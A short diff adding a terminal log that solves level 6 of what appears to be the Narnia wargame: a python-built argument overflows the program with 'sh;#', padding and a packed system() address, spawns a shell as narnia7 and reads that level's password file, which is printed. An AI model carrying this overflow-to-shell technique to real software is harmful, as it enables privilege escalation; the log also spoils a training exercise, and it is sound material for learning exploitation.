@@ -1,0 +1,5 @@
+narnia6@narnia:/narnia$ ./narnia6 `python -c "print 'sh;#' +'A'*4 + '\x50\xc8\xe4\xf7'"` B
+$ id
+uid=14007(narnia7) gid=14006(narnia6) groups=14006(narnia6)
+$ cat /etc/narnia_pass/narnia7
+ahkiaziphu
